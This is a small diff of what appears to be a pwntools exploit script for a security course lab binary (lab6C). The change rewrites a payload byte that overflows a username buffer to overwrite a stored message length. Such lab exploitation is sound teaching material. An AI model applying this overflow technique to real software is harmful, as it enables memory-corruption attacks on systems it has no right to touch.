@@ -5,7 +5,7 @@ r = s.process(b"/levels/lab06/lab6C")
 
 r.recvuntil(b'Enter your username\n')
 payload = b'A' * 40
-payload += b'\xc6' # overwrite save->msglen in order to copy 198 bytes from the original buffer
+payload += p8(198) # overwrite save->msglen in order to copy 198 bytes from the original buffer
 r.sendline(payload)
 
 payload = b'A' * 196
